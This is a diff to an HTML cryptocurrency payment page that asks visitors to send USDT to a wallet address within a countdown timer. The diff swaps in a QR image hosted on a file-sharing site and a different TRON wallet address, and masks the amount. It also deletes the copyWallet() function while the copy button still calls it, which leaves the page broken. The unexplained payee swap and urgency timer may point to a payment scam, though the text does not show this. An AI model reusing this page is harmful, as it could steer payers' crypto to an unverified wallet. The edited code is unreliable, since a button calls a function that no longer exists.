@@ -1,10 +1,12 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Payment Page</title>
-    <style>
+
+<style>
         * {
             margin: 0;
             padding: 0;
@@ -210,7 +212,7 @@
         <h1>Scan QR code with your wallet or copy the details to complete your payment.</h1>
 
         <div class="qr-code">
-            <img src="https://via.placeholder.com/150" alt="QR Code">
+            <img src="https://files.catbox.moe/tcx03w.png" alt="QR Code">
         </div>
 
         <div class="note">
@@ -224,7 +226,7 @@
         <div class="amount-section">
             <label for="amount">Amount</label>
             <div class="input-container">
-                <input id="amount" type="text" value="136.77" readonly>
+                <input id="amount" type="text" value="***" readonly>
                 <div class="currency">
                     <div class="icon">T</div>
                     USDT20
@@ -236,7 +238,7 @@
         <div class="wallet-section">
             <label for="wallet">Wallet Address</label>
             <div class="input-container">
-                <input id="wallet" type="text" value="0xd83a0049d5ec194b5f7cb858f437e7af47" readonly>
+                <input id="wallet" type="text" value="TSmythSUVtkup9SiGBde94PRyBK6knRU9j" readonly>
                 <div class="copy-icon" onclick="copyWallet()">📋</div>
             </div>
         </div>
@@ -284,12 +286,7 @@ window.onload = function() {
             });
         }
 
-        function copyWallet() {
-            const walletField = document.getElementById('wallet');
-            navigator.clipboard.writeText(walletField.value).then(() => {
-                alert("Wallet address copied to clipboard!");
-            });
-        }
+        
 
         // Timer function to update countdown
         let timeRemaining = 59 * 60 + 58; // 59 minutes 58 seconds
